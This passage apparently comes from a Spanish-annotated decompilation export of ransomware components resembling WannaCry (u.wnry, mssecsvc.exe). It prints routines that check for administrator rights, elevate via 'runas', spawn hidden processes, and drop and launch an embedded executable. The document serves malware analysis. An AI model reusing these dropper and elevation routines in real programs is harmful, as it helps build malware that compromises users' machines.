  BVar1 = AllocateAndInitializeSid(&local_8,'\x02',0x20,0x220,0,0,0,0,0,0,&local_c);
  if (BVar1 == 0) {
    return 0;
  }
  BVar1 = CheckTokenMembership((HANDLE)0x0,local_c,&local_10);
  if (BVar1 == 0) {
    local_10 = 0;
  }
  FreeSid(local_c);
  return local_10;
}
```

### u.wnry · 00401b50

Nombre en exportación: FUN_00401b50-00401b50.

```c
bool __cdecl FUN_00401b50(LPCSTR param_1,LPCSTR param_2,int param_3)

{
  BOOL BVar1;
  int iVar2;
  HWND *ppHVar3;
  SHELLEXECUTEINFOA local_3c;

  ppHVar3 = (HWND *)&local_3c.fMask;
  for (iVar2 = 0xe; iVar2 != 0; iVar2 = iVar2 + -1) {
    *ppHVar3 = (HWND)0x0;
    ppHVar3 = ppHVar3 + 1;
  }
  local_3c.fMask = 0;
  local_3c.lpDirectory = (LPCSTR)0x0;
  local_3c.lpFile = param_1;
  local_3c.nShow = -(uint)(param_3 != 0) & 5;
  local_3c.cbSize = 0x3c;
  local_3c.lpParameters = param_2;
  local_3c.lpVerb = s_runas_0041fdac;
  BVar1 = ShellExecuteExA(&local_3c);
  return (bool)('\x01' - (BVar1 != 1));
}
```

### u.wnry · 00401a90

Nombre en exportación: FUN_00401a90-00401a90.

```c
undefined4 __cdecl FUN_00401a90(LPSTR param_1,DWORD param_2,LPDWORD param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  int iVar3;
  LPSTR *ppCVar4;
  _PROCESS_INFORMATION local_54;
  _STARTUPINFOA local_44;

  local_44.cb = 0x44;
  ppCVar4 = &local_44.lpReserved;
  for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppCVar4 = (LPSTR)0x0;
    ppCVar4 = ppCVar4 + 1;
  }
  local_54.hThread = (HANDLE)0x0;
  local_54.dwProcessId = 0;
  local_54.dwThreadId = 0;
  local_54.hProcess = (HANDLE)0x0;
  local_44.dwFlags = 1;
  local_44.wShowWindow = 0;
  BVar1 = CreateProcessA((LPCSTR)0x0,param_1,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,&local_44,&local_54);
  if (BVar1 == 0) {
    return 0;
  }
  if (param_2 != 0) {
    DVar2 = WaitForSingleObject(local_54.hProcess,param_2);
    if (DVar2 != 0) {
      TerminateProcess(local_54.hProcess,0xffffffff);
    }
    if (param_3 != (LPDWORD)0x0) {
      GetExitCodeProcess(local_54.hProcess,param_3);
    }
  }
  CloseHandle(local_54.hProcess);
  CloseHandle(local_54.hThread);
  return 1;
}
```

### ec1383… · 1800011a4

Nombre en exportación: PlayGame-1800011a4.

```c
undefined8 PlayGame(void)

{
                    /* 0x11a4  1  PlayGame */
  sprintf(&DAT_18000d2a0,"C:\\%s\\%s","WINDOWS","mssecsvc.exe");
  Extraer_Recurso_W_101();
  Crear_Proceso_Carga();
  return 0;
}
```

### ec1383… · 180001014

Nombre en exportación: Extraer_Recurso_W_101-180001014.

```c
/* FindResourceA ID 0x65, tipo W. Primer DWORD = tamaño; WriteFile comienza en recurso+4. No hay
   descifrado en esta rutina. */

undefined8 Extraer_Recurso_W_101(void)

{
  DWORD DVar1;
  HRSRC hResInfo;
  HGLOBAL hResData;
  DWORD *pDVar2;
  HANDLE hFile;
  DWORD local_res8 [2];

  hResInfo = FindResourceA(DAT_18000d3a8,(LPCSTR)0x65,"W");
  if ((((hResInfo == (HRSRC)0x0) ||
       (hResData = LoadResource(DAT_18000d3a8,hResInfo), hResData == (HGLOBAL)0x0)) ||
      (pDVar2 = LockResource(hResData), pDVar2 == (DWORD *)0x0)) ||
     (DVar1 = SizeofResource(DAT_18000d3a8,hResInfo), DVar1 == 0)) {
    return 0;
  }
  DVar1 = *pDVar2;
  hFile = CreateFileA(&DAT_18000d2a0,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,2,4,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffffffffffff) {
    WriteFile(hFile,pDVar2 + 1,DVar1,local_res8,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
  }
  return 1;
}
```

### ec1383… · 1800010f8

Nombre en exportación: Crear_Proceso_Carga-1800010f8.

```c
/* CreateProcessA sobre ruta global. Comprobación estática; no atribuye un vector de infección
   histórico. */

undefined8 Crear_Proceso_Carga(void)

{
  BOOL BVar1;
  _PROCESS_INFORMATION local_98;
  _STARTUPINFOA local_78;

  local_98.hProcess = (HANDLE)0x0;
  local_98.hThread = (HANDLE)0x0;
  local_98.dwProcessId = 0;
  local_98.dwThreadId = 0;
  FUN_1800011f0(&local_78.lpReserved,0,0x60);
  local_78.cb = 0x68;
  local_78.wShowWindow = 0;
  local_78.dwFlags = 0x81;
  BVar1 = CreateProcessA((LPCSTR)0x0,&DAT_18000d2a0,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,&local_78,
                         &local_98);
  if (BVar1 != 0) {
    CloseHandle(local_98.hThread);
    CloseHandle(local_98.hProcess);
  }
  return 0;
}
```
